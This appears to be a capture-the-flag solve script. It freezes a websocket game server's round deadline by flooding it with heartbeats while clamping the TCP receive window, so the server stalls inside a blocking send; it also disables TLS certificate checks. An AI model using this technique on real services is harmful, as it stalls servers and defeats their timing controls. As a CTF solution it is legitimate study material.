"""choppediver oa — solve script.

The server's round loop calls `ws.send(hb_ack)` on every heartbeat. That
send is a blocking `sendall`: once the server's TCP send buffer fills up,
the whole main thread parks inside the kernel, and the round's deadline
check (which only fires from the recv loop) stops running.

Per round:
  1. Before the round starts, queue a volley of heartbeats large enough
     that their replies will overflow the server's send buffer.
  2. Clamp our receive window small so the server's send buffer stays
     full as it tries to transmit the replies.
  3. Take as long as we want to classify the chart. The server is
     parked inside sendall; the deadline is frozen.
  4. Send the answer plus the next round's volley, then unclamp and
     drain the hb_ack backlog. The server unwedges, walks through the
     queued heartbeats, and finally reaches our answer.
"""
from __future__ import annotations

import argparse
import json
import os
import socket
import ssl
import subprocess
import tempfile
import time
from pathlib import Path

from websockets.sync.client import connect


DEFAULT_URL = "wss://127.0.0.1:4443/"

CLAMP_TIGHT = 1024
RCVBUF_TIGHT = 4096
CLAMP_LOOSE = 1 << 20
RCVBUF_LOOSE = 1 << 20

VOLLEY_SIZE = 150

HB_MESSAGE = json.dumps({"type": "heartbeat"})
ANSWER_MAP = {"b": "buy", "s": "sell", "h": "hold",
              "buy": "buy", "sell": "sell", "hold": "hold"}


def _tighten(sock: socket.socket) -> None:
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, CLAMP_TIGHT)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, RCVBUF_TIGHT)


def _loosen(sock: socket.socket) -> None:
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_WINDOW_CLAMP, CLAMP_LOOSE)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, RCVBUF_LOOSE)


def _display(png: bytes, round_idx: int) -> None:
    path = Path(tempfile.gettempdir()) / f"chopp_round_{round_idx:02d}.png"
    path.write_bytes(png)
    try:
        subprocess.Popen(
            ["xdg-open", str(path)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
    except FileNotFoundError:
        print(f"[solve] saved chart to {path} (open it yourself)")


def _prompt() -> str:
    while True:
        raw = input("[solve] answer (b=buy, s=sell, h=hold): ").strip().lower()
        if raw in ANSWER_MAP:
            return ANSWER_MAP[raw]


def _send_volley(ws, n: int) -> None:
    for _ in range(n):
        ws.send(HB_MESSAGE)


def _drain_until_verdict(ws):
    while True:
        msg = ws.recv(timeout=60)
        if isinstance(msg, (bytes, bytearray)):
            continue
        data = json.loads(msg)
        if data.get("type") == "hb_ack":
            continue
        return data


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default=os.environ.get("CHOPP_URL", DEFAULT_URL))
    ap.add_argument("--volley", type=int, default=VOLLEY_SIZE)
    args = ap.parse_args()

    sslctx = ssl.create_default_context()
    sslctx.check_hostname = False
    sslctx.verify_mode = ssl.CERT_NONE

    print(f"[solve] connecting to {args.url}")
    ws = connect(args.url, ssl=sslctx, open_timeout=10, max_size=None,
                 max_queue=1, ping_interval=None)
    sock: socket.socket = ws.socket

    total = json.loads(ws.recv())["total"]
    print(f"[solve] server says hello; {total} rounds total")

    ws.send(json.dumps({"type": "ready"}))
    _send_volley(ws, args.volley)

    for round_idx in range(total):
        _tighten(sock)

        meta = json.loads(ws.recv())
        r, budget_ms = meta["round"], meta["time_ms"]
        print(f"\n[solve] === round {r}/{total}, budget {budget_ms}ms ===")

        png = ws.recv()
        if not isinstance(png, (bytes, bytearray)):
            print(f"[solve] unexpected frame during chart recv: {png!r}")
            return
        print(f"[solve] got chart ({len(png)} bytes)")
        _display(png, r)

        t0 = time.monotonic()
        answer = _prompt()
        print(f"[solve] think time: {(time.monotonic()-t0)*1000:.0f}ms")

        ws.send(json.dumps({"type": "answer", "value": answer}))
        if round_idx + 1 < total:
            _send_volley(ws, args.volley)

        _loosen(sock)
        verdict = _drain_until_verdict(ws)
        t = verdict.get("type")
        if t == "correct":
            print("[solve] server: CORRECT")
            continue
        if t == "pass":
            print(f"\n[solve] *** PASS *** FLAG: {verdict['flag']}")
            return
        print(f"[solve] server: {t} {verdict.get('reason','')}")
        return

    verdict = _drain_until_verdict(ws)
    if verdict.get("type") == "pass":
        print(f"\n[solve] FLAG: {verdict['flag']}")
    else:
        print(f"[solve] unexpected final: {verdict}")


if __name__ == "__main__":
    main()
